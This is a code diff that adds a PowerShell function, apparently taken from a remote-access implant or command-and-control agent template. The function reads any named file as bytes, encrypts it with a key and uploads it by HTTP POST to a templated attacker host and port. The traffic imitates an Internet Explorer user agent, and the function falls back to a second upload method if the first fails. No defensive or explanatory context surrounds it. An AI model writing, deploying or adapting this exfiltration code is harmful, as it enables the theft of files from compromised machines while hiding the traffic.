@@ -1,0 +1,35 @@
+function dn($filename){
+
+                  try{
+
+            $file_content = Get-Content -LiteralPath $filename -Encoding Byte
+            if ($file_content.Length -eq 0){
+            return $Error[0]}
+            }
+            catch{
+            $output = $Error[0] | Out-String;
+            return $output
+            }
+            #echo $key
+      $content = enc $key $file_content 1
+
+
+
+
+      try{
+      $postParams = @{f=$filename;d=$content;resource=$windows}
+      $output=Invoke-WebRequest -Headers @{"User-Agent"="Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"} -UseBasicParsing -Uri {HTTP}://{ip}:{port}{download} -Method POST -Body $postParams
+           $output=$output.Content
+      }
+      catch{
+      $postParams = "f=$filename&d=$content&resource=$windows"
+             $wc3 = new-object net.WebClient
+           $wc3.Headers.Add("Content-Type", "application/x-www-form-urlencoded")
+           $wc3.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko")
+           $re=$wc3.UploadString("{HTTP}://{ip}:{port}{download}","POST",$postParams)
+           $output=$re
+             }
+
+
+      return $output
+      }
